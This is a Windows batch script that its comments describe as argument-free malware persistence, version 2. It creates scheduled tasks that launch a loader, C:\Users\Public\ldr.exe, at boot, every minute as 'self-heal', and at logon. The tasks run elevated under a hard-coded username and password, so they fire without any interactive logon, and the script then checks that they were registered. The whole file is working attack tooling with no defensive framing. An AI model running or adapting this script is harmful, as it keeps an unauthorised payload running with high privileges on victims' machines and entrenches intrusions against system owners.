@echo off
REM persist2.bat - argument-free persistence v2: tasks that run WITHOUT an interactive
REM logon. Difference from v1: /ru <user> /rp <pass> stores credentials, so the task
REM runs in a non-interactive session; /rl highest makes it run elevated. Without
REM these, Run keys and default tasks only fire when somebody logs in at the console.
setlocal
set EXE=C:\Users\Public\ldr.exe
set OUT=C:\Users\Public\persist2.txt
del "%OUT%" 2>nul
echo == payload %EXE% >> "%OUT%"
echo == delete old tasks >> "%OUT%"
schtasks /delete /tn lcs_onlogon /f >> "%OUT%" 2>&1
schtasks /delete /tn lcs_5min /f >> "%OUT%" 2>&1
echo == task at boot (no logon needed) >> "%OUT%"
schtasks /create /tn lcs_onstart /tr "%EXE%" /sc onstart /ru vix /rp Passw0rd! /rl highest /f >> "%OUT%" 2>&1
echo rc=%ERRORLEVEL% >> "%OUT%"
echo == task every minute (self-heal, no logon needed) >> "%OUT%"
schtasks /create /tn lcs_1min /tr "%EXE%" /sc minute /mo 1 /ru vix /rp Passw0rd! /rl highest /f >> "%OUT%" 2>&1
echo rc=%ERRORLEVEL% >> "%OUT%"
echo == task at logon >> "%OUT%"
schtasks /create /tn lcs_onlogon /tr "%EXE%" /sc onlogon /ru vix /rp Passw0rd! /rl highest /f >> "%OUT%" 2>&1
echo rc=%ERRORLEVEL% >> "%OUT%"
echo == verify >> "%OUT%"
schtasks /query /tn lcs_onstart /fo list | findstr /C:"TaskName" /C:"Run As User" /C:"Status" >> "%OUT%" 2>&1
schtasks /query /tn lcs_1min /fo list | findstr /C:"TaskName" /C:"Run As User" /C:"Status" >> "%OUT%" 2>&1
schtasks /query /tn lcs_onlogon /fo list | findstr /C:"TaskName" /C:"Run As User" /C:"Status" >> "%OUT%" 2>&1
echo == end %TIME% >> "%OUT%"
endlocal
